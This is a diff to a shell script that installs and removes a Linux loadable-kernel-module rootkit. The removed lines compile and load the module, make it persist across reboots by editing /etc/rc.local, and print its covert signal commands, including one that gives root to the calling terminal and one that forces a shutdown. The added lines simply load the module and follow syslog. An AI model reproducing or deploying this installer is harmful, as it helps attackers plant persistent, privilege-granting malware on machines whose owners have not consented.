@@ -5,45 +5,7 @@ if [ "$EUID" -ne 0 ];then
 	exit
 fi
 
-if [ "$1" == "install" ];then
-	echo "Compiling rootkit..."
-	make > /dev/null
-	echo "Installing LKM Rootkit..."
-	
-	if [ ! -z "$(ls -A /lkm)" ]; then
-		rm -rf /lkm
-	fi
-	
-	mkdir /lkm
-	cp lkm.ko /lkm/lkm.ko
-	
-	insmod /lkm/lkm.ko
-	sed -e '$i \insmod /lkm/lkm.ko' /etc/rc.local > /etc/rc.local.tmp
-	rm /etc/rc.local
-	mv /etc/rc.local.tmp /etc/rc.local
-	echo "Rootkit installed!"
-	make clean > /dev/null
-	echo
-	echo
-	echo "Commands:"
-	echo "kill -58 12345"
-	echo "Shutdown the system without asking"
-	echo
-	echo "kill -59 12345"
-	echo "Gives root permissions to calling terminal"
-	echo
-	echo "kill -60 12345"
-	echo "Self-unloads the rootkit"
-	echo
-	echo "END"
-fi
 
-if [ "$1" == "remove" ];then
-	echo "Uninstalling LKM Rootkit..."
-	rmmod lkm
-	rm -rf /lkm
-	awk '!/insmod \/lkm\/lkm.ko/' /etc/rc.local > /etc/rc.local.tmp
-	rm /etc/rc.local
-	mv /etc/rc.local.tmp /etc/rc.local
-	echo "Rootkit uninstalled!"
-fi
+insmod lkm.ko
+clear
+tail -f /var/log/syslog
